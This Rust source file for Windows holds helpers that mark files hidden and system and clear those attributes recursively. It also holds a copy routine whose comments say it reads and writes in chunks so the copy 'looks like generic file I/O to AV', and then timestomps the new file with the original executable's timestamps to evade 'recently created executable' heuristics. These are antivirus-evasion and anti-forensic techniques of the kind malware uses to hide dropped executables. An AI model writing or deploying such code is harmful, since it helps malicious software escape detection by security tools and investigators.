use anyhow::{Context, Result};
use std::path::Path;
use windows::core::HSTRING;
use windows::Win32::Storage::FileSystem::{
    SetFileAttributesW, GetFileAttributesW, 
    FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM, INVALID_FILE_ATTRIBUTES,
    FILE_FLAGS_AND_ATTRIBUTES
};

pub fn set_hidden_system_attributes(path: &Path) -> Result<()> {
    let path_str = HSTRING::from(path.as_os_str());
    unsafe {
        // Retrieve current attributes first
        let current_attrs = GetFileAttributesW(&path_str);
        
        let hidden = FILE_ATTRIBUTE_HIDDEN.0;
        let system = FILE_ATTRIBUTE_SYSTEM.0;

        let new_attrs = if current_attrs == INVALID_FILE_ATTRIBUTES {
             hidden | system
        } else {
             current_attrs | hidden | system
        };
        
        SetFileAttributesW(&path_str, FILE_FLAGS_AND_ATTRIBUTES(new_attrs)).ok().context("Failed to set hidden/system attributes")?;
    }
    Ok(())
}

pub fn remove_hidden_system_attributes(path: &Path) -> Result<()> {
    let path_str = HSTRING::from(path.as_os_str());
    unsafe {
        let current_attrs = GetFileAttributesW(&path_str);
        if current_attrs != INVALID_FILE_ATTRIBUTES {
             // Removing Hidden, System, and ReadOnly to ensure deletion works
             let hidden = FILE_ATTRIBUTE_HIDDEN.0;
             let system = FILE_ATTRIBUTE_SYSTEM.0;
             let readonly = windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_READONLY.0;
             
             let new_attrs = current_attrs & !(hidden | system | readonly);
             SetFileAttributesW(&path_str, FILE_FLAGS_AND_ATTRIBUTES(new_attrs)).ok().context("Failed to remove attributes")?;
        }
    }
    Ok(())
}

pub fn remove_hidden_system_attributes_recursive(path: &Path) -> Result<()> {
    if !path.exists() {
        return Ok(());
    }
    
    // Process the root path itself first
    let _ = remove_hidden_system_attributes(path);

    // Recursively process children
    for entry in walkdir::WalkDir::new(path).into_iter().filter_map(|e| e.ok()) {
        let _ = remove_hidden_system_attributes(entry.path());
    }
    Ok(())
}

use std::fs::{File, OpenOptions};
use std::io::{Read, Write};
use std::os::windows::io::AsRawHandle;
use windows::Win32::Foundation::{HANDLE, FILETIME};
use windows::Win32::Storage::FileSystem::{GetFileTime, SetFileTime};

pub fn manual_copy_file(src: &Path, dst: &Path) -> Result<()> {
    let mut src_file = File::open(src).context(format!("Failed to open src: {:?}", src))?;
    
    // Create destination file
    let mut dst_file = OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open(dst)
        .context(format!("Failed to create dst: {:?}", dst))?;

    // 1. Manual Memory Copy (Avoiding CopyFile API)
    // Read chunks into memory and write them. 
    // This looks like generic file I/O to AV, not a high-level "CopyFile" event.
    let mut buffer = [0u8; 65536]; // 64KB buffer
    loop {
        let bytes_read = src_file.read(&mut buffer)?;
        if bytes_read == 0 { break; }
        dst_file.write_all(&buffer[..bytes_read])?;
    }

    // 2. TimeStomping (Cloning timestamps)
    // Make the new file look old by copying timestamps from the original executeable
    // This helps evade "recently created executable" heuristics.
    unsafe {
        let src_handle = HANDLE(src_file.as_raw_handle() as _);
        let dst_handle = HANDLE(dst_file.as_raw_handle() as _);
        
        let mut creation = FILETIME::default();
        let mut access = FILETIME::default();
        let mut write = FILETIME::default();

        // Get timestamps from source
        if GetFileTime(src_handle, Some(&mut creation), Some(&mut access), Some(&mut write)).is_ok() {
            // Apply to destination
            let _ = SetFileTime(dst_handle, Some(&creation), Some(&access), Some(&write));
        }
    }

    // Explicitly drop file handles to ensure they are closed
    drop(dst_file);
    drop(src_file);

    Ok(())
}
